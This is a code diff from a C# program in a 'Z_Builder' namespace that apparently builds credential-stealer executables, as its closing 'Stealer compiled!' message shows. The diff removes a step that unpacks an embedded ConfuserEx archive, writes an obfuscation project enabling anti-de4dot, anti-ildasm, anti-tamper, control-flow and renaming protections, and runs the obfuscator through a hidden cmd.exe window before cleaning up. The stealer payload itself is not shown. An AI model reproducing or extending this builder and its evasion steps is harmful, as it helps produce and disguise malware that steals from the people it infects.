@@ -362,36 +362,6 @@ namespace Z_Builder
                 File.Delete(Path.GetDirectoryName(path) + "\\Names.txt");
             }
             catch { }
-            File.WriteAllBytes(tempPath + "\\ConfuserEx.zip", Properties.Resources.ConfuserEx);
-            ZipFile.ExtractToDirectory(tempPath + "\\ConfuserEx.zip", tempPath + "\\ConfuserEx");
-            string crprojCode = string.Join(
-                Environment.NewLine,
-                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
-                "<project outputDir=\"" + Path.GetDirectoryName(path) + "\" baseDir=\"" + Path.GetDirectoryName(path) + "\" xmlns=\"http://confuser.codeplex.com\">",
-                "  <rule pattern=\"true\" inherit=\"false\">",
-                "    <protection id=\"anti de4dot\" />",
-                "    <protection id=\"anti ildasm\" />",
-                "    <protection id=\"anti tamper\" />",
-                "    <protection id=\"anti watermark\" />",
-                "    <protection id=\"constant mutate\" />",
-                "    <protection id=\"constants\" />",
-                "    <protection id=\"ctrl flow\" />",
-                "    <protection id=\"integrity prot\" />",
-                "    <protection id=\"invalid metadata\" />",
-                "    <protection id=\"invalid cctor\" />",
-                "    <protection id=\"junk\" />",
-                "    <protection id=\"module properties\" />",
-                "    <protection id=\"opcode prot\" />",
-                "    <protection id=\"reduce md\" />",
-                "    <protection id=\"ref proxy\" />",
-                "    <protection id=\"stack underflow\" />",
-                "    <protection id=\"rename\" />",
-                "  </rule>",
-                "  <module path=\"" + Path.GetFileName(path) + "\" />",
-                "</project>"
-            );
-            File.WriteAllText(tempPath + @"\ConfuserEx\198v2\obf.crproj", crprojCode);
-            File.Copy(tempPath + @"\ConfuserEx\198v2\Names.txt", Path.GetDirectoryName(path) + "\\Names.txt");
             compars.GenerateExecutable = true;
             compars.OutputAssembly = path;
             compars.GenerateInMemory = false;
@@ -424,20 +394,6 @@ namespace Z_Builder
                 try
                 {
                     File.Delete(Application.StartupPath + @"\manifest.manifest");
-                }
-                catch { }
-                Process p = new Process();
-                p.StartInfo.FileName = "cmd.exe";
-                p.StartInfo.WorkingDirectory = tempPath + @"\ConfuserEx\198v2";
-                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                p.StartInfo.Arguments = "/C Confuser.CLI obf.crproj";
-                p.Start();
-                p.WaitForExit();
-                try
-                {
-                    File.Delete(tempPath + @"\ConfuserEx.zip");
-                    Directory.Delete(tempPath + @"\ConfuserEx", true);
-                    File.Delete(Path.GetDirectoryName(path) + "\\Names.txt");
                 }
                 catch { }
                 MessageBox.Show("Stealer compiled!");
